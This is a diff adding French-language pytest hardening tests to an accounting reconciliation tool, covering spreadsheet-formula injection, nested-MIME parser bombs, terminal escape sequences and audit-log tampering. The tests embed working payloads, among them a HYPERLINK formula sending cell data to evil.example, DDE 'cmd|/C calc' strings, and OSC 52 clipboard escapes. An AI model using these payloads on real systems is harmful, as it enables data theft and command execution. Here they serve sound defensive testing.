@@ -1247,3 +1247,225 @@ def test_cli_promesse_succes(entree, inst, capsys):
     rc, _, err = cli(capsys, inst, "promesse", "--dossier", "ALPHA", "--reference", "A-002",
                      "--date", "2026-12-01", "--par", VALIDEUSE, date=jour(2))
     assert rc == 1 and "hors de" in err
+
+
+# ---------------------------------------------------------------------------
+# Durcissement apres la revue adversariale (attaques reelles)
+# ---------------------------------------------------------------------------
+
+DECLENCHEURS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _cellules_dangereuses(chemin: Path) -> list[str]:
+    with open(chemin, encoding="utf-8", newline="") as f:
+        cellules = [c for ligne in csv.reader(f) for c in ligne]
+    return [c for c in cellules if c.startswith(DECLENCHEURS) and not _est_nombre(c)]
+
+
+def _est_nombre(c: str) -> bool:
+    try:
+        Decimal(c)
+    except Exception:
+        return False
+    return True
+
+
+def _imbrique(n: int) -> bytes:
+    corps = b"Content-Type: text/plain\r\n\r\nx\r\n"
+    for _ in range(n):
+        corps = b"Content-Type: message/rfc822\r\n\r\n" + corps
+    return b"From: inconnu@evil.example\r\nMessage-ID: <bombe@x>\r\nMIME-Version: 1.0\r\n" + corps
+
+
+def test_aucune_formule_de_tableur_dans_les_csv_du_cycle(tmp_path):
+    formule = '=HYPERLINK("https://evil.example/?d="&A2,"Voir")'
+    entree = ecrire_entree(tmp_path / "e", operations=[
+        ["ALPHA", "2026-09-03", formule, "120.00", "A-001"],
+        ["BETA", "2026-09-10", "@SUM(1+1)*cmd|' /C calc'!A0", "230.40", "B-001"],
+    ])
+    with open(entree / "releve_bancaire.csv", "a", newline="", encoding="utf-8") as f:
+        csv.writer(f).writerow(["ALPHA", "2026-09-05", "2026-09-05", "+cmd|' /C calc'!A0", "",
+                                "15.00", "EUR", "A-009"])       # credit -> a_verifier
+    inst = nouvelle_instance(tmp_path / "i")
+    with Depot(inst.depot) as d:                                  # piece escaladee piegee
+        d.sauver_pieces([PieceAttendue(
+            "G-001", "GAMMA", "2026-09", Decimal("145.00"), dt.date(2026, 9, 11), "-2+3*cmd",
+            etat=EtatPiece.ESCALADEE, nb_relances=3, date_premiere_demande=dt.date(2026, 9, 14))])
+    ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@evil.example", message_id="<p@x>",
+               fichiers=(('=IMPORTXML(CONCAT("https:",B2),"a").pdf', b"%PDF"),))
+    (inst.entrant / "=bombe.eml").write_bytes(_imbrique(1000))   # nom piege en quarantaine
+    lancer(entree, inst, J0)
+    fichiers = sorted(inst.sortie.glob("*.csv"))
+    assert {f.name for f in fichiers} >= {"pieces_attendues.csv", "a_verifier.csv", "escalades.csv",
+                                          "file_humaine.csv", "quarantaine.csv", "tableau_suivi.csv",
+                                          "periodes.csv"}
+    for f in fichiers:
+        assert _cellules_dangereuses(f) == [], f.name
+    assert lire_csv(inst.sortie / "file_humaine.csv")[0]["nom_fichier"].startswith("'=IMPORTXML")
+    assert lire_csv(inst.sortie / "quarantaine.csv")[0]["nom_fichier"] == "'=bombe.eml"
+    (escalade,) = lire_csv(inst.sortie / "escalades.csv")
+    assert escalade["libelle"] == "'-2+3*cmd" and escalade["montant"] == "145.00"   # nombre intact
+
+
+def test_routage_par_domaine_seulement_s_il_est_declare(tmp_path):
+    def instance_avec(domaines_alpha: str) -> cycle.ResumeCycle:
+        rep = tmp_path / (domaines_alpha or "aucun")
+        entree = ecrire_entree(rep / "e")
+        with open(entree / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
+            w = csv.writer(f)
+            w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact", "jour_echeance_tva",
+                        "ton_relance", "circuit", "email_relais", "domaines"])
+            for ligne in DOSSIERS:
+                w.writerow([*ligne, domaines_alpha if ligne[0] == "ALPHA" else ""])
+        inst = nouvelle_instance(rep / "i")
+        ecrire_eml(inst.entrant, "1.eml", expediteur="comptable2@alpha-sarl.fr", message_id="<d@a>",
+                   corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
+        return lancer(entree, inst, J0), inst
+
+    r, inst = instance_avec("alpha-sarl.fr")
+    assert r.propositions == 1
+    assert cycle.lister_file(inst)[0].reference_operation == "A-001"
+    r, inst = instance_avec("")
+    assert r.propositions == 0
+    assert cycle.lister_file(inst)[0].motif is MotifNonRoute.DOSSIER_INCONNU
+
+
+def test_eml_imbrique_mis_en_quarantaine_sans_bloquer_les_autres(entree, inst):
+    bombe = _imbrique(1000)
+    (inst.entrant / "0-bombe.eml").write_bytes(bombe)
+    ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@x>",
+               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
+    r = lancer(entree, inst, J0)
+    assert (r.brouillons_crees, r.propositions, r.quarantaine, r.messages_lus) == (2, 1, 1, 1)
+    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
+    assert q["nom_fichier"] == "0-bombe.eml"
+    assert q["empreinte"] == hashlib.sha256(bombe).hexdigest()
+    assert q["raison"].startswith("RecursionError") and "Traceback" not in q["raison"]
+    r2 = lancer(entree, inst, J0)                                 # retente, journalise une seule fois
+    assert r2.quarantaine == 1 and len(lire_csv(inst.sortie / "quarantaine.csv")) == 1
+    assert actions_audit(inst).count("eml_quarantaine") == 1
+    assert JournalAudit(inst.audit).verifier().ok
+    (inst.entrant / "0-bombe.eml").unlink()                       # retire par un humain
+    lancer(entree, inst, J0)
+    assert lire_csv(inst.sortie / "quarantaine.csv") == []
+
+
+def test_journal_tronque_refus_avant_toute_ecriture_puis_reparation(entree, tmp_path, capsys):
+    entree1 = ecrire_entree(tmp_path / "e1", operations=[OPERATIONS[0]])
+    inst = nouvelle_instance(tmp_path / "i")
+    lancer(entree1, inst, J0)
+    fragment = b'{"acteur":"systeme","action":"pie'                # coupure pendant une ecriture
+    with open(inst.audit, "ab") as f:
+        f.write(fragment)
+    avant = etat_depot(inst)
+    with pytest.raises(cycle.JournalNonSain, match="reparer-audit"):
+        lancer(entree, inst, jour(1))                             # 5 nouvelles pieces : aucune ecrite
+    b = cycle.brouillons(inst)[0]
+    with pytest.raises(cycle.JournalNonSain):
+        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(jour(1)))
+    with pytest.raises(cycle.JournalNonSain):
+        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="x", maintenant=a_10h(jour(1)))
+    assert etat_depot(inst) == avant
+    assert cycle.exporter(inst, tmp_path / "secours.json").exists()   # lecture toujours possible
+
+    assert cli(capsys, inst, "reparer-audit", "--par", "Mallory", date=jour(1))[0] == 1
+    assert inst.audit.read_bytes().endswith(fragment)
+    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", "paul martin", date=jour(1))
+    assert rc == 0 and f"{len(fragment)} octet(s)" in out
+    (sauvegarde,) = inst.racine.glob("audit.jsonl.fragment-*")
+    assert sauvegarde.read_bytes() == fragment
+    derniere = JournalAudit(inst.audit).lire()[-1]
+    assert (derniere.action, derniere.acteur) == ("journal_repare", "Paul Martin")
+    assert derniere.details["octets_retires"] == len(fragment)
+    assert derniere.details["fragment"] == sauvegarde.name
+    assert cycle.verifier_audit(inst).ok
+    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", VALIDEUSE, date=jour(1))
+    assert rc == 0 and "rien a reparer" in out and actions_audit(inst).count("journal_repare") == 1
+    assert lancer(entree, inst, jour(1)).pieces_creees == 4
+
+
+def test_journal_altere_au_milieu_reparation_refusee(entree, inst, capsys):
+    lancer(entree, inst, J0)
+    lignes = inst.audit.read_bytes().split(b"\n")
+    lignes[1] = lignes[1].replace(b"ALPHA", b"ALFA", 1)
+    altere = b"\n".join(lignes)
+    inst.audit.write_bytes(altere)
+    from rapprochement.audit import JournalCorrompu
+    with pytest.raises(JournalCorrompu):
+        cycle.reparer_audit(inst, VALIDEUSE, maintenant=a_10h(J0))
+    rc, _, err = cli(capsys, inst, "reparer-audit", "--par", VALIDEUSE)
+    assert rc == 1 and "REFUS (JournalCorrompu)" in err and "reparation refusee" in err
+    assert inst.audit.read_bytes() == altere and not list(inst.racine.glob("audit.jsonl.fragment-*"))
+    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
+    assert rc == 1 and "JournalNonSain" in err
+
+
+def test_validateurs_bom_crlf_commentaires(tmp_path):
+    inst = nouvelle_instance(tmp_path / "i", validateurs=None)
+    inst.validateurs.write_bytes("﻿Marie Durand\r\n\r\n# ancien : Jean\r\n  Paul Martin  \r\n".encode())
+    assert cycle.lire_validateurs(inst) == ("Marie Durand", "Paul Martin")
+    assert cycle.exiger_validateur(inst, "marie durand") == "Marie Durand"
+    with pytest.raises(cycle.ValidateurRefuse):
+        cycle.exiger_validateur(inst, "# ancien : Jean")
+    inst.validateurs.write_bytes("H\xe9l\xe8ne\n".encode("latin-1"))
+    with pytest.raises(cycle.ValidateurRefuse, match="illisible"):
+        cycle.exiger_validateur(inst, "Hélène")
+
+
+def test_cli_neutralise_les_sequences_d_echappement(tmp_path, capsys):
+    entree = ecrire_entree(tmp_path / "e", operations=[
+        ["ALPHA", "2026-09-03", "CB LOXAM \x1b[2J\x1b]52;c;ZXZpbA==\x07", "120.00", "A-001"]])
+    inst = nouvelle_instance(tmp_path / "i")
+    e = ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@evil.example", message_id="<x@y>",
+                   fichiers=(("f.pdf", b"%PDF"),))
+    e.write_bytes(e.read_bytes().replace(b"Message-ID: <x@y>",
+                                         b"Message-ID: \x1b[1A\x1b[2K\x1b[1A\x1b[2Kcache"))
+    lancer(entree, inst, J0)
+    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="litige \x1b[31mrouge‮",
+                        maintenant=a_10h(J0))
+    sorties = []
+    for commande in ("file", "pieces"):
+        rc, out, err = cli(capsys, inst, commande)
+        assert rc == 0
+        sorties.append(out + err)
+    rc, out, err = cli(capsys, inst, "rattacher", "--message-id", "\x1b[2Kcache", "--par", VALIDEUSE)
+    assert rc == 1
+    sorties.append(out + err)
+    rc, out, err = cli(capsys, inst, "cycle", "--entree", str(entree))
+    sorties.append(out + err)
+    tout = "".join(sorties)
+    assert "\x1b" not in tout and "\x07" not in tout and "‮" not in tout
+    assert "cache" in sorties[0] and "\\x1b" in sorties[0]
+    assert "litige \\x1b[31mrouge\\u202e" in sorties[1]           # motif visible, inerte
+
+
+def test_rattacher_leve_le_blocage_du_cycle_jamais_un_blocage_manuel(entree, tmp_path, inst):
+    lancer(entree, inst, J0)
+    valider_et_envoyer(inst, J0)
+    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
+        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
+    ])
+    lancer(entree2, inst, jour(7))                                # le moteur retrouve A-002 : bloquee
+    assert pieces_par_ref(inst)["A-002"].motif_blocage.startswith(cycle.PREFIXE_MOTIF_CYCLE)
+    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="Litige avec le loueur",
+                        maintenant=a_10h(jour(7)))
+    n = len(JournalAudit(inst.audit).lire())
+    m = a_10h(jour(7))
+
+    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, dossier="ALPHA", reference="A-002",
+                              id_piece="P-77")
+    assert p.etat is EtatPiece.RECUE and not p.bloquee
+    nouvelles = JournalAudit(inst.audit).lire()[n:]
+    assert [e.details.get("evenement") for e in nouvelles if e.action == "transition"] == [
+        "piece_rattachee", "blocage_leve"]
+    assert cycle.controler_piece(inst, "ALPHA", "A-002", VALIDEUSE, conforme=True,
+                                 maintenant=m).etat is EtatPiece.VALIDEE
+
+    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, dossier="ALPHA", reference="A-001",
+                              id_piece="P-loxam")
+    assert p.etat is EtatPiece.RECUE and p.bloquee and p.motif_blocage == "Litige avec le loueur"
+    with pytest.raises(etats.TransitionInterdite, match="bloquee"):
+        cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True, maintenant=m)
+    cycle.debloquer_piece(inst, "ALPHA", "A-001", "Paul Martin", motif="litige clos", maintenant=m)
+    assert cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True,
+                                 maintenant=m).etat is EtatPiece.VALIDEE
